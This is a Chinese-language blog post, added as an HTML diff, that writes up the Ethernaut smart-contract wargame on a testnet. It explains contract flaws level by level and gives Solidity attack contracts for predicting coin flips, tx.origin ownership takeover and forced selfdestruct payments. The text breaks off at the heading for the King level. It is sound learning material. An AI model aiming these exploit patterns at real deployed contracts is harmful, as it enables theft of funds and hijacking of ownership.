@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="zn-Ch">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Fantome">
+
+
+
+
+
+<title>BlockChain Learning Blog 2 | Fantome&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/project/Deep%20River.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/project/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/project/js/script.js"></script>
+    
+    <script src="/project/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/project/">Fantome&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/project/archives">Posts</a>
+                
+                    <a class="menu-item" href="/project/category">Categories</a>
+                
+                    <a class="menu-item" href="/project/tag">Tags</a>
+                
+                    <a class="menu-item" href="/project/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/project/">Fantome&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/project/archives">Posts</a>
+                
+                    <a class="menu-item" href="/project/category">Categories</a>
+                
+                    <a class="menu-item" href="/project/tag">Tags</a>
+                
+                    <a class="menu-item" href="/project/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">BlockChain Learning Blog 2</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Fantome</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 26, 2024&nbsp;&nbsp;18:29:38</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><ol>
+<li><p>注册MetaMask钱包，保存好12个单词</p>
+</li>
+<li><p>启动<a target="_blank" rel="noopener" href="https://sepolia-faucet.pk910.de/%E6%8C%96%E6%B5%8B%E8%AF%95%E5%B8%81">https://sepolia-faucet.pk910.de/挖测试币</a></p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240409204713595.png" alt="image-20240409204713595"></p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240409224755337.png" alt="image-20240409224755337"></p>
+</li>
+</ol>
+<hr>
+<h1 id="正式做题"><a href="#正式做题" class="headerlink" title="正式做题"></a>正式做题</h1><h3 id="0-Hello-Ethernaut"><a href="#0-Hello-Ethernaut" class="headerlink" title="0. Hello Ethernaut"></a>0. Hello Ethernaut</h3><p>通过不断的<code>await contract.___()</code>获取下一步的信息,再不知所云的浪费了两次测试币之后完成了第0题.</p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240409235136447.png" alt="image-20240409235136447"></p>
+<h3 id="1-Fallback"><a href="#1-Fallback" class="headerlink" title="1. Fallback"></a>1. Fallback</h3><p>本关有2个通关要求:</p>
+<ol>
+<li>获得合约的所有权</li>
+<li>清空合约的余额</li>
+</ol>
+<p>读源码可以知道, 有两个变更合约所有权的入口, 分别是<code>contribute()</code>和<code>receive()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function contribute() public payable &#123;</span><br><span class="line">        require(msg.value &lt; 0.001 ether);</span><br><span class="line">        contributions[msg.sender] += msg.value;</span><br><span class="line">        if (contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是<code>contribute()</code>需要sender的value大于owner, 但是这需要sender的contribution大于owner的<code>1000 * (1 ether)</code>, 这需要不断地调用<code>contribute()</code>, 显然是难以实现的.</p>
+<p>所以我们选择<code>receive()</code>方法, 即先调用一次<code>contribute()</code>, 使我的value &gt; 0, 再使用<code>sendTransaction()</code>构造转载交易发送给合约, 使满足<code>receive()</code>的调用要求<code>msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0</code>, 至此, 也就拥有了合约的所有权.</p>
+<p>再使用<code>withdraw()</code>取出余额即可.</p>
+<p>![](C:\Users\wjx27\Pictures\Screenshots\屏幕截图 2024-04-10 190843.png)</p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240410190852617.png" alt="image-20240410190852617"></p>
+<h3 id="2-Fallout"><a href="#2-Fallout" class="headerlink" title="2. Fallout"></a>2. Fallout</h3><p>本关要求获取合约的所有权</p>
+<p>根据提示<code>Fal1out</code>找到以下源代码:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// constructor</span><br><span class="line">    function Fal1out() public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        allocations[owner] = msg.value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查找资料得到, 对于Solidity来说, 0.4.22前的编译器版本支持同合约名的构造函数, 但在本题中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br></pre></td></tr></table></figure>
+
+<p>而高于0.4.22版本, 只支持利用<code>constructor()</code>构建.</p>
+<p>而在该合同的源码中, 其试图用和合约名称相同的函数充当构造函数, 出现了错误, 将<code>Fallout()</code>写成了<code>Fal1out()</code>, 使得其他人可以重复调用<code>Fal1out()</code>, 获取合约所有权.</p>
+<p>但是在做题的时候出现了一点问题, 执行<code>contract.owner===player</code>的结果是<code>false</code>, 但是onwer的地址和player的地址是相同的,且submit也成功了.</p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240410200611886.png" alt="image-20240410200611886"></p>
+<h3 id="3-Coin-Flip"><a href="#3-Coin-Flip" class="headerlink" title="3. Coin Flip"></a>3. Coin Flip</h3><p>本关要求连续猜对10次硬币的正反面 (很显然只能靠我强大的占卜能力bushi</p>
+<p>源码中coinflip的结果是根据以下代码决定的:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">       if (lastHash == blockValue) &#123;</span><br><span class="line">           revert();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       lastHash = blockValue;</span><br><span class="line">       uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">       bool side = coinFlip == 1 ? true : false;</span><br></pre></td></tr></table></figure>
+
+<p>可以知道, 要获取硬币的正反面结果需要确定<code>blockValue</code>的值, 即区块高度, 而攻击点在区块中的数据都是共享且确定的, 所有我们可以编写攻击合约去调用<code>victim</code>合约 (即本关合约), 这样在每一次的交易中提交到区块, 其区块高度都是一样的, 再通过复刻<code>flip()</code>, 计算硬币的正反面结果即可. </p>
+<p>攻击合约代码:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface CoinFlipInterface &#123;</span><br><span class="line">    function flip(bool _guess) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FlipCoin &#123;</span><br><span class="line"></span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    CoinFlipInterface victim;</span><br><span class="line"></span><br><span class="line">    constructor(address _victim) &#123;</span><br><span class="line">        victim = CoinFlipInterface(_victim);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Attack() public returns (bool) &#123;</span><br><span class="line">        bool guess_ = guess();</span><br><span class="line">        return victim.flip(guess_);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess() public view returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line">        return side;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240411123824547.png" alt="image-20240411123824547"></p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240411122303911.png" alt="image-20240411122303911"></p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240411124353090.png" alt="image-20240411124353090"></p>
+<p>连续攻击十次之后</p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240411124414587.png" alt="image-20240411124414587"></p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240411124452998.png" alt="image-20240411124452998"></p>
+<h3 id="4-Telephone"><a href="#4-Telephone" class="headerlink" title="4. Telephone"></a>4. Telephone</h3><p>本关要求获取合同的所有权</p>
+<p>根据源码可得突破口:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function changeOwner(address _owner) public &#123;</span><br><span class="line">        if (tx.origin != msg.sender) &#123;</span><br><span class="line">            owner = _owner;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>则需要编写攻击合约使<code>tx.origin</code>与<code>msg.sender</code>不等.</p>
+<p>[^tx.origin]: Solidity的一个全局变, 它遍历整个调用栈并返回最初发送调用(或事务)的帐户的地址.<br>[^msg.sender]: 直接调用智能合约的功能的账户或者智能合约的地址</p>
+<p>因此当同一笔交易中有多笔调用时, <code>tx.origin</code>保持不变, 而<code>msg.sender</code>则会改变, 根据此原理编写智能合约, 将该合约作为中间人展开攻击.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface TelephoneInterface &#123;</span><br><span class="line">    function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attacker &#123;</span><br><span class="line">    TelephoneInterface tele;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) &#123;</span><br><span class="line">        tele = TelephoneInterface(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(address _owner) public &#123;</span><br><span class="line">        tele.changeOwner(_owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240411142902274.png" alt="image-20240411142902274"></p>
+<p>调用<code>attack()</code>, 并将参数设为MetaMask的地址, 使<code>tx.origin</code>与<code>msg.sender</code>不等, 就可以将合约的所有权发生变更.</p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240411142705985.png" alt="image-20240411142705985"></p>
+<h3 id="5-Token"><a href="#5-Token" class="headerlink" title="5. Token"></a>5. Token</h3><p>本关要求在最初拥有20tokens的基础上,获得任意数量的token.</p>
+<p>根据源码我们可以找到突破口是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这里有一个编写错误, 即<code>uint256</code>没有做溢出检查, 会产生<code>0-1=255</code>和<code>255+1=0</code>的错误, 通过这样的错误, 我们可以实现token的增加.</p>
+<p>因此, 我们可以通过向合约转账21tokens, 使得发生<code>20-21=255</code>的向下溢出, 获取大量tokens.</p>
+<p>PS: 在查找资料时发现了<code>SafeMath</code>库, 其功能就是为了避免程序的结果出现溢出, 与本关漏洞的修复相对契合.</p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240411172400505.png" alt="image-20240411172400505"></p>
+<h3 id="6-Delegation"><a href="#6-Delegation" class="headerlink" title="6. Delegation"></a>6. Delegation</h3><p>本关要求获得合约<code>Delegation</code>的所有权.</p>
+<p>根据源码可以发现<code>Delegate</code>的中所有权变更的代码:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function pwn() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是我们发现<code>Delegation</code>没有所有权变更的代码, 这时候根据提示我们去了解<code>delegatecall</code>低级函数.</p>
+<p>call函数簇用于实现跨合约的函数调用功能, 包括以下三种:</p>
+<ul>
+<li><strong>call</strong> : 最常用的调用方式, 调用后内置变量msg的值会修改为调用者, 执行环境为被调用者的运行环境(合约的storage).</li>
+<li><strong>delegatecall</strong> : 调用后内置变量msg的值不会修改为调用者, 但执行环境为调用者的运行环境.</li>
+<li><strong>callcode</strong> : 调用后内置变量msg的值会修改为调用者, 但执行环境为调用者的运行环境.</li>
+</ul>
+<p>以用户A通过B合约调用C合约举例说明三者区别: </p>
+<ul>
+<li><strong>call</strong> : 调用后, 内置变量msg的值会修改为调用者B, 执行环境为被调用者的运行环境C.</li>
+<li><strong>delegatecall</strong> : 调用后, 内置变量msg的值A不会修改为调用者, 执行环境为调用者的运行环境B.</li>
+<li><strong>callcode</strong> : 调用后, 内置变量msg的值会修改为调用者B, 执行环境为调用者的运行环境B.</li>
+</ul>
+<p>因此就可以找到合约<code>Delegation</code>的突破口:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fallback() external &#123;</span><br><span class="line">        (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">            this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>当在调用<code>fallback</code>函数时, 虽然调用的是<code>delegate</code>里的函数, 但是是在<code>Delegation</code>环境中调用的, 因此可以完成合约<code>Delegation</code>的所有权转让.</p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240413112004395.png" alt="image-20240413112004395"></p>
+<h3 id="7-Force"><a href="#7-Force" class="headerlink" title="7. Force"></a>7. Force</h3><p>本关的目标是使合约的余额大于零.</p>
+<p>这似乎照理来说应该很简单，但是读完源码的我frozen了:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/ SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123; /*</span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">    /~____  =ø= /</span><br><span class="line">    (______)__m_m)</span><br><span class="line">                   */ &#125;</span><br></pre></td></tr></table></figure>
+
+<p>空有contract, 难不成是神奇的注释大法?</p>
+<blockquote>
+<p>在实际中，如果要给智能合约转账，有几种常见方法。</p>
+<p>Transfer: Throws exception when an error occurs, and the code will not execute afterward<br>Send: The transfer error does not throw an exception and returns true&#x2F;false. The code will continue to execute.<br>call.value().gas: Transfer error does not throw an exception and returns true&#x2F;false. The code will execute, but call functions for transfer are prone to reentrancy attacks.</p>
+<p>三种方式存在一个前提，即接受合约必须能够接受转账，即存在payable函数，否则将会回退。</p>
+</blockquote>
+<p>没有payable函数的情况下, 根据提示, 是需要我们自己编写攻击合同, 而这时我们引入<strong>自毁合约</strong>的概念</p>
+<p>攻击合约:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract ForceAttack &#123;</span><br><span class="line">    constructor()  payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function destruct(address payable _addr) public &#123;</span><br><span class="line">        selfdestruct(_addr); //在新版本已被弃用</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先部署10Wei在攻击合同中, 然后以被攻击合约地址作为指定地址就可以在攻击合约自毁之后将其剩余的ether发送给被攻击合约即可.</p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414164727354.png" alt="image-20240414164727354"></p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414164804019.png" alt="image-20240414164804019"></p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414164813818.png" alt="image-20240414164813818"></p>
+<h3 id="8-Vault"><a href="#8-Vault" class="headerlink" title="8. Vault"></a>8. Vault</h3><p>本关要求解锁这个保险柜 (vault).</p>
+<p>根据源码可以知道, 想解锁这个合约<code>Vault</code>, 需要知道password:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract Vault &#123;</span><br><span class="line">    bool public locked;</span><br><span class="line">    bytes32 private password;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32 _password) &#123;</span><br><span class="line">        locked = true;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes32 _password) public &#123;</span><br><span class="line">        if (password == _password) &#123;</span><br><span class="line">            locked = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>现需要获取<code>password</code>这个私有变量, 虽然<code>password</code>是私密的, 但是一切变量都是<strong>储存在链上的</strong>, 所以想获取<code>password</code>, 根据以下步骤:</p>
+<p><code>web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])</code>, 这个命令可以看到储存在某个地址的某个内容</p>
+<p>[^address]: String - The address to get the storage from.<br>[^position]: Number|String|BN|BigNumber - The index position of the storage.</p>
+<p>[^[, defaultBlock]]: Number|String|BN|BigNumber - (optional) If you pass this parameter it will not use the default block set with web3.eth.defaultBlock. Pre-defined block numbers as “earliest”, “latest” and “pending” can also be used.<br>[^[, callback]]: Function - (optional) Optional callback, returns an error object as first parameter and the result as second.</p>
+<p>接下来, <code>password</code>的地址在哪里, 这则需要了解以太坊数据储存的规则:</p>
+<p>以太坊数据存储会为合约的每项数据指定一个可计算的存储位置, 存放在一个容量为2^256的超级数组中, 数组中每个元素称为插槽(slot), 其初始值为0. 虽然数组容量的上限很高, 但实际上存储是稀疏的, 只有非零 (空值) 数据才会被真正写入存储. 每个数据存储的插槽位置是一定的.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 插槽式数组存储</span><br><span class="line">----------------------------------</span><br><span class="line">|               0                |     # slot 0</span><br><span class="line">----------------------------------</span><br><span class="line">|               1                |     # slot 1</span><br><span class="line">----------------------------------</span><br><span class="line">|               2                |     # slot 2</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # ...</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # 每个插槽 32 字节</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # ...</span><br><span class="line">----------------------------------</span><br><span class="line">|            2^256-1             |     # slot 2^256-1</span><br><span class="line">----------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>每个插槽32字节, 对于值类型, 其存放是连续的, 满足以下规律:</p>
+<ul>
+<li><p>存储插槽的第一项会以低位对齐 (即右对齐) 的方式储存;</p>
+</li>
+<li><p>基本类型仅使用存储它们所需的字节;</p>
+</li>
+<li><p>如果存储插槽中的剩余空间不足以储存一个基本类型, 那么它会被移入下一个存储插槽;</p>
+</li>
+<li><p>结构和数组数据总是会占用一整个新插槽 (但结构或数组中的各项, 都会以这些规则进行打包)</p>
+</li>
+</ul>
+<p>举个例子:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    address a;      // 0</span><br><span class="line">    uint8 b;        // 0</span><br><span class="line">    uint256 c;      // 1</span><br><span class="line">    bytes24 d;      // 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其储存结构为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (11) | b (1) |            a (20)           | &lt;- slot 0</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                       c (32)                      | &lt;- slot 1</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (8) |                d (24)                | &lt;- slot 2</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+
+
+<p>回到本关, 其password的储存结构为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (31) |           locked(1)                 | &lt;- slot 0</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                       password (32)               | &lt;- slot 1</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>则<code>password</code>的地址为solt 1, 则通过上文提到的命令获得<code>password</code>.</p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414172613800.png" alt="image-20240414172613800"></p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414172739760.png" alt="image-20240414172739760"></p>
+<h3 id="9-King"><a href="#9-King" class="headerlink" title="9. King"></a>9. King</h3><p>本关要求打破当<code>summit instance</code>的时候, 关卡会自动将获得王权的这个”自我宣告”.</p>
+<p>源码中王权转移的代码:</p>
